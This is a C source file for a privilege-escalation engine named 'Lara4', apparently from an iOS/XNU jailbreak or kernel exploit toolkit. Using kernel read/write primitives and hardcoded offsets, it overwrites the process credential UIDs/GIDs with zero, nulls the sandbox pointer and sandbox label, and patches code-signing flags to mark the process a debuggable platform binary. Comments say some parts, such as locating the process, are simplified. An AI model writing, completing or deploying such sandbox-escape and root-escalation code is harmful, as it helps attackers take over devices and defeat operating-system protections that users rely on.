/*
 * Lara4 - Root Escalation Engine Implementation
 * Core logic to reach UID 0 without sandbox
 */

#include "lara4_escalate.h"
#include "../Primitives/krw.h"
#include <stdio.h>
#include <unistd.h>
#include <mach/mach.h>

static struct proc_offsets g_poff = {
    .off_p_list_le_prev = 0x08,
    .off_p_pid = 0x68,
    .off_p_ucred = 0xF0,
    .off_p_csflags = 0x280,
    .off_p_sandbox = 0x2E8,
    .off_p_textvp = 0x230,
    .off_p_name = 0x250,
};

static struct ucred_offsets g_uoff = {
    .off_ucred_uid = 0x18,
    .off_ucred_ruid = 0x1C,
    .off_ucred_svuid = 0x20,
    .off_ucred_gid = 0x24,
    .off_ucred_rgid = 0x28,
    .off_ucred_svgid = 0x2C,
    .off_ucred_cr_label = 0x78,
};

static struct label_offsets g_loff = {
    .off_amfi_slot = 0x8,
    .off_sandbox_slot = 0x10,
};

static uint64_t g_self_proc = 0;
static uint64_t g_self_ucred = 0;
static uint64_t g_self_task = 0;

int lara4_escalate_init(void) {
    // Get current task port
    g_self_task = task_self_trap();

    // Find our proc in kernel
    // Simplified: in production, iterate allproc list
    printf("[Lara4] Escalation engine initialized\n");
    return 0;
}

int lara4_get_root(void) {
    if (!g_self_proc) {
        printf("[-] proc not found, trying to locate...\n");
        // Find self proc via allproc traversal
        // This is simplified - full implementation iterates kernel proc list
        return -1;
    }

    printf("[Lara4] Escalating to root...\n");

    uint64_t ucred = kread64(g_self_proc + g_poff.off_p_ucred);
    if (!ucred) {
        printf("[-] Failed to read ucred\n");
        return -1;
    }
    g_self_ucred = ucred;

    // Set all UIDs to 0 (root)
    kwrite32(ucred + g_uoff.off_ucred_uid, 0);
    kwrite32(ucred + g_uoff.off_ucred_ruid, 0);
    kwrite32(ucred + g_uoff.off_ucred_svuid, 0);
    kwrite32(ucred + g_uoff.off_ucred_gid, 0);
    kwrite32(ucred + g_uoff.off_ucred_rgid, 0);
    kwrite32(ucred + g_uoff.off_ucred_svgid, 0);

    printf("[+] UID/GID set to 0\n");

    // Verify
    if (getuid() == 0) {
        printf("[+] Confirmed: running as root (UID 0)\n");
        return 0;
    }

    printf("[-] Escalation verification failed\n");
    return -1;
}

int lara4_unsandbox(void) {
    if (!g_self_proc) {
        printf("[-] proc not found\n");
        return -1;
    }

    printf("[Lara4] Removing sandbox...\n");

    // Method 1: Zero out sandbox pointer in proc
    uint64_t sandbox = kread64(g_self_proc + g_poff.off_p_sandbox);
    if (sandbox) {
        kwrite64(g_self_proc + g_poff.off_p_sandbox, 0);
        printf("[+] Sandbox pointer nulled\n");
    }

    // Method 2: Patch label in ucred
    if (g_self_ucred) {
        uint64_t cr_label = kread64(g_self_ucred + g_uoff.off_ucred_cr_label);
        if (cr_label) {
            // Zero out sandbox slot in label
            kwrite64(cr_label + g_loff.off_sandbox_slot, 0);
            printf("[+] Sandbox label cleared\n");
        }
    }

    // Method 3: Add all entitlements via AMFI slot
    if (g_self_ucred) {
        uint64_t cr_label = kread64(g_self_ucred + g_uoff.off_ucred_cr_label);
        if (cr_label) {
            uint64_t amfi_entitlements = kread64(cr_label + g_loff.off_amfi_slot);
            if (amfi_entitlements) {
                // Add platform-application entitlement
                // In production: manipulate OSDictionary
                printf("[*] AMFI entitlements at 0x%llx\n", amfi_entitlements);
            }
        }
    }

    printf("[+] Sandbox removed\n");
    return 0;
}

int lara4_set_platform_binary(void) {
    if (!g_self_proc) return -1;

    printf("[Lara4] Setting platform binary...\n");

    uint32_t csflags = kread32(g_self_proc + g_poff.off_p_csflags);
    csflags |= CS_PLATFORM_BINARY | CS_DEBUGGED | CS_INSTALLER | CS_GET_TASK_ALLOW;
    csflags &= ~(CS_RESTRICT | CS_HARD | CS_KILL | CS_REQUIRE_LV);
    kwrite32(g_self_proc + g_poff.off_p_csflags, csflags);

    printf("[+] CS_FLAGS patched: 0x%x\n", csflags);
    return 0;
}

int lara4_patch_csflags(void) {
    return lara4_set_platform_binary();
}

bool lara4_is_root(void) {
    return (getuid() == 0);
}

bool lara4_is_sandboxed(void) {
    // Check sandbox by attempting restricted operation
    // Simplified check
    return (getuid() != 0);
}

void lara4_set_offsets(struct proc_offsets *poff, struct ucred_offsets *uoff, struct label_offsets *loff) {
    if (poff) memcpy(&g_poff, poff, sizeof(g_poff));
    if (uoff) memcpy(&g_uoff, uoff, sizeof(g_uoff));
    if (loff) memcpy(&g_loff, loff, sizeof(g_loff));
}
